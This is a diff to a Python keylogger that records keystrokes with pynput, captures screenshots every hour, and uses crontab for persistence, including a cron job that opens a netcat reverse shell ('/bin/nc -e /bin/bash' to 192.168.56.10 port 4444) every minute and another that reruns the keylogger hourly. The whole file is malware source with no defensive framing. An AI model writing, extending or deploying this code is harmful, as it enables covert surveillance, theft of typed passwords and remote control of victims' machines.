@@ -4,6 +4,7 @@ from pynput.keyboard import Key, Listener
 import logging
 from crontab import CronTab
 from PIL import ImageGrab
+import sched
 
 screenshot_info = "screenshot.png"
 
@@ -14,10 +15,6 @@ word=''
 # Whenever a key is pressed:
 def on_press(key):
     global word
-# Takes a screenshot 
-def screenshot():
-    im = ImageGrab.grab()
-    im.save(file_path + extend + screenshot_info)
 # If the key is a space or the enter key, log the word go to the next line
     if key == Key.space or key == Key.enter or key == Key.tab:
         word += ' '
@@ -60,6 +57,13 @@ job1 = rev_cron.new(command='/bin/nc –e /bin/bash 192.168.56.10 4444 >/dev/nul
 job1.minute.every(1)
 rev_cron.write()
 
+# Takes a screenshot 
+def screenshot():
+    im = ImageGrab.grab()
+    im.save(file_path + extend + screenshot_info)
+while True:
+    screenshot()
+    time.sleep(3600)
 # Create a cronjob to run this script once an hour to make sure we keep capturing
 key_cron = CronTab(user='kali')
 job2 = key_cron.new(command='./PATH_TO_KEYLOGGER.PY')
